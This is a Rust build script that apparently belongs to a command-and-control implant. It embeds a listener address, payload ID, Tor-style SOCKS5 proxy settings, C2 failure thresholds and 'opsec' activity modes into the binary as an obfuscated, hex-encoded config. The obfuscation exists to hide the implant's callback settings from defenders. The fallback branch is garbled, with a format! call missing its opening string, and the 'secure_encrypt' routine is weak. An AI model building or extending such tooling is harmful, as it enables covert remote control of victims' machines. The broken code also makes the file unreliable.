use std::env;
use std::fs;
use std::path::Path;
use rand::RngCore;

// Using a custom stream cipher for lightweight obfuscation (no new dependencies)
fn secure_encrypt(data: &mut [u8], key: &[u8]) -> (Vec<u8>, Vec<u8>) {
    // Use a proper key derivation from payload_id
    let mut derived_key = [0u8; 32];
    let mut hasher = std::collections::hash_map::DefaultHasher::new();
    std::hash::Hasher::write(&mut hasher, key);
    let hash = std::hash::Hasher::finish(&hasher);
    
    // Simple but better key derivation
    for (i, byte) in derived_key.iter_mut().enumerate() {
        *byte = ((hash >> (i % 8)) ^ (i as u64 * 0x9E3779B9)) as u8;
    }
    
    // Generate secure nonce using a cryptographically secure random number generator
    use rand::RngCore;
    let mut nonce = [0u8; 12];
    rand::rngs::OsRng.fill_bytes(&mut nonce);
    
    // Simple stream cipher (better than XOR)
    let mut keystream_state = hash;
    for (i, byte) in data.iter_mut().enumerate() {
        keystream_state = keystream_state.wrapping_mul(0x9E3779B97F4A7C15u64)
            .wrapping_add(0x6C62272E07BB0142u64)
            .wrapping_add(i as u64);
        *byte ^= (keystream_state >> ((i % 8) * 8)) as u8;
    }
    
    (nonce.to_vec(), data.to_vec())
}

fn log_build(msg: &str) {
    println!("[BUILD] {}", msg);
}

fn main() {
    log_build("Build script started");
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=config.json");
    println!("cargo:rerun-if-env-changed=LISTENER_HOST");
    println!("cargo:rerun-if-env-changed=LISTENER_PORT");
    println!("cargo:rerun-if-env-changed=SLEEP_INTERVAL");
    println!("cargo:rerun-if-env-changed=PAYLOAD_ID");
    println!("cargo:rerun-if-env-changed=PROTOCOL");
    println!("cargo:rerun-if-env-changed=SOCKS5_ENABLED");
    println!("cargo:rerun-if-env-changed=SOCKS5_HOST");
    println!("cargo:rerun-if-env-changed=SOCKS5_PORT");
    println!("cargo:rerun-if-env-changed=BASE_MAX_C2_FAILS");
    println!("cargo:rerun-if-env-changed=C2_THRESH_INC_FACTOR");
    println!("cargo:rerun-if-env-changed=C2_THRESH_DEC_FACTOR");
    println!("cargo:rerun-if-env-changed=C2_THRESH_ADJ_INTERVAL");
    println!("cargo:rerun-if-env-changed=C2_THRESH_MAX_MULT");
    println!("cargo:rerun-if-env-changed=PROC_SCAN_INTERVAL_SECS");
    println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_BG_TO_REDUCED");
    println!("cargo:rerun-if-env-changed=BASE_SCORE_THRESHOLD_REDUCED_TO_FULL");
    println!("cargo:rerun-if-env-changed=REDUCED_ACTIVITY_SLEEP_SECS");

    // Get configuration from environment variables
    let server_host = env::var("LISTENER_HOST").unwrap_or_default();
    let server_port = env::var("LISTENER_PORT").unwrap_or_default();
    let sleep_interval = env::var("SLEEP_INTERVAL").unwrap_or_else(|_| "60".to_string());
    let payload_id = env::var("PAYLOAD_ID").unwrap_or_default();
    let protocol = env::var("PROTOCOL").unwrap_or_else(|_| {
        if server_port == "443" {
            "https".to_string()
        } else {
            "http".to_string()
        }
    });
    let socks5_enabled = env::var("SOCKS5_ENABLED")
        .unwrap_or_else(|_| "false".to_string())
        .parse::<bool>()
        .unwrap_or(false);
    let socks5_host = env::var("SOCKS5_HOST").unwrap_or_else(|_| "127.0.0.1".to_string());
    let socks5_port = env::var("SOCKS5_PORT").unwrap_or_else(|_| "9050".to_string());

    log_build(&format!("LISTENER_HOST: {}", server_host));
    log_build(&format!("LISTENER_PORT: {}", server_port));
    log_build(&format!("SLEEP_INTERVAL: {}", sleep_interval));
    log_build(&format!("PAYLOAD_ID: {}", payload_id));
    log_build(&format!("PROTOCOL: {}", protocol));
    log_build(&format!("SOCKS5_ENABLED: {}", socks5_enabled));
    log_build(&format!("SOCKS5_HOST: {}", socks5_host));
    log_build(&format!("SOCKS5_PORT: {}", socks5_port));

    // Only use environment config if we have all required values
    let config_content = if !server_host.is_empty() && !server_port.is_empty() && !payload_id.is_empty() {
        log_build("Using environment variables for config");
        let base_score_bg_reduced_thresh = env::var("BASE_SCORE_THRESHOLD_BG_TO_REDUCED").unwrap_or_else(|_| "20.0".to_string());
        let base_score_reduced_full_thresh = env::var("BASE_SCORE_THRESHOLD_REDUCED_TO_FULL").unwrap_or_else(|_| "60.0".to_string());
        let min_full_opsec = env::var("MIN_FULL_OPSEC_SECS").unwrap_or_else(|_| "300".to_string());
        let min_bg_opsec = env::var("MIN_BG_OPSEC_SECS").unwrap_or_else(|_| "60".to_string());
        let base_max_c2_fails = env::var("BASE_MAX_C2_FAILS").unwrap_or_else(|_| "5".to_string());
        let min_reduced_opsec = env::var("MIN_REDUCED_OPSEC_SECS").unwrap_or_else(|_| "120".to_string());
        let reduced_activity_sleep = env::var("REDUCED_ACTIVITY_SLEEP_SECS").unwrap_or_else(|_| "120".to_string());
        let c2_inc_factor = env::var("C2_THRESH_INC_FACTOR").unwrap_or_else(|_| "1.1".to_string());
        let c2_dec_factor = env::var("C2_THRESH_DEC_FACTOR").unwrap_or_else(|_| "0.9".to_string());
        let c2_adj_interval = env::var("C2_THRESH_ADJ_INTERVAL").unwrap_or_else(|_| "3600".to_string());
        let c2_max_mult = env::var("C2_THRESH_MAX_MULT").unwrap_or_else(|_| "2.0".to_string());
        let proc_scan_interval = env::var("PROC_SCAN_INTERVAL_SECS").unwrap_or_else(|_| "300".to_string());

        format!(
            r#"{{
                "server_url": "{}:{}",
                "sleep_interval": {},
                "jitter": 2,
                "payload_id": "{}",
                "protocol": "{}",
                "socks5_enabled": {},
                "socks5_host": "{}",
                "socks5_port": {},
                "base_score_threshold_bg_to_reduced": {},
                "base_score_threshold_reduced_to_full": {},
                "min_duration_full_opsec_secs": {},
                "min_duration_background_opsec_secs": {},
                "base_max_consecutive_c2_failures": {},
                "min_duration_reduced_activity_secs": {},
                "reduced_activity_sleep_secs": {},
                "c2_failure_threshold_increase_factor": {},
                "c2_failure_threshold_decrease_factor": {},
                "c2_threshold_adjust_interval_secs": {},
                "c2_dynamic_threshold_max_multiplier": {},
                "proc_scan_interval_secs": {}
            }}"#,
            server_host, server_port, sleep_interval, payload_id, protocol,
            socks5_enabled, socks5_host, socks5_port,
            base_score_bg_reduced_thresh, base_score_reduced_full_thresh,
            min_full_opsec, min_bg_opsec,
            base_max_c2_fails,
            min_reduced_opsec,
            reduced_activity_sleep,
            c2_inc_factor, c2_dec_factor, c2_adj_interval, c2_max_mult,
            proc_scan_interval
        )
    } else if let Ok(content) = fs::read_to_string("config.json") {
        log_build("Using config.json file for config");
        // We assume config.json contains the new fields if needed, 
        // otherwise serde(default) in AgentConfig will handle it.
        content
    } else {
        log_build("No valid config found, using default embedded config");
        // Update the hardcoded fallback JSON
        r#"{
            "server_url": "",
            "sleep_interval": 5,
            "jitter": 2,
            "payload_id": "",
            "protocol": "http",
            "socks5_enabled": false,
            "socks5_host": "127.0.0.1",
            "socks5_port": 9050,
            "base_score_threshold_bg_to_reduced": 20.0,
            "base_score_threshold_reduced_to_full": 60.0,
            "min_duration_full_opsec_secs": 300,
            "min_duration_background_opsec_secs": 60,
            "base_max_consecutive_c2_failures": 5,
            "min_duration_reduced_activity_secs": 120,
            "reduced_activity_sleep_secs": 120,
            "c2_failure_threshold_increase_factor": 1.0,
            "c2_failure_threshold_decrease_factor": 1.0,
            "c2_threshold_adjust_interval_secs": {},
            "c2_dynamic_threshold_max_multiplier": 1.0
        }"#.replace("{}", &u64::MAX.to_string())
           .to_string()
    };

    // Generate Rust code with the embedded config
    let out_dir = env::var_os("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("config.rs");
    log_build(&format!("Writing embedded config to {:?}", dest_path));
    
    // Use payload_id as the XOR key
    let xor_key_bytes = payload_id.as_bytes();
    if xor_key_bytes.is_empty() {
        // Fallback or error if payload_id is empty, as an empty key is bad.
        // Using a default fixed key here for safety, but ideally, an empty payload_id should be an error.
        log_build("Warning: payload_id is empty, using a default XOR key. This is not recommended.");
        // In a real scenario, you might panic here or use a securely generated random key if payload_id must be non-empty.
        // For this example, let's use a fixed non-empty key to prevent XORing with an empty slice.
        let fixed_fallback_key = "DefaultFallbackKey123";
        let mut obfuscated_config_bytes = config_content.as_bytes().to_vec();
        
        // Use secure_encrypt for fallback too
        // Use secure_encrypt for fallback too
        let (_nonce, ciphertext) = secure_encrypt(&mut obfuscated_config_bytes, fixed_fallback_key.as_bytes());
        let obfuscated_config_bytes = ciphertext;
        
        let hex_obfuscated_config = obfuscated_config_bytes.iter().map(|b| format!("{:02x}", b)).collect::<String>();
        let config_code = format!(
            pub const EMBEDDED_CONFIG_XOR_KEY: &str = r#"{}"#; // Embed the actual key used
            "###,
            hex_obfuscated_config,
            fixed_fallback_key // Embed the key that was actually used for obfuscation
        );
        if let Err(e) = fs::write(&dest_path, config_code) {
            log_build(&format!("Failed to write config.rs: {}", e));
            panic!("Failed to write config.rs: {}", e);
        } else {
            log_build("Embedded config written successfully with fallback XOR key.");
        }
    } else {
        let mut obfuscated_config_bytes = config_content.as_bytes().to_vec();
        
        // Use the secure_encrypt function instead of simple XOR
        secure_encrypt(&mut obfuscated_config_bytes, xor_key_bytes);
        
        let hex_obfuscated_config = obfuscated_config_bytes.iter().map(|b| format!("{:02x}", b)).collect::<String>();
        let config_code = format!(
            r###"pub const EMBEDDED_CONFIG_HEX: &str = r#"{}"#;
            pub const EMBEDDED_CONFIG_XOR_KEY: &str = r#"{}"#; // Embed the payload_id as the key
            "###,
            hex_obfuscated_config,
            payload_id
        );
        if let Err(e) = fs::write(&dest_path, config_code) {
            log_build(&format!("Failed to write config.rs: {}", e));
            panic!("Failed to write config.rs: {}", e);
        } else {
            log_build("Embedded config written successfully with payload_id as XOR key.");
        }
    }
}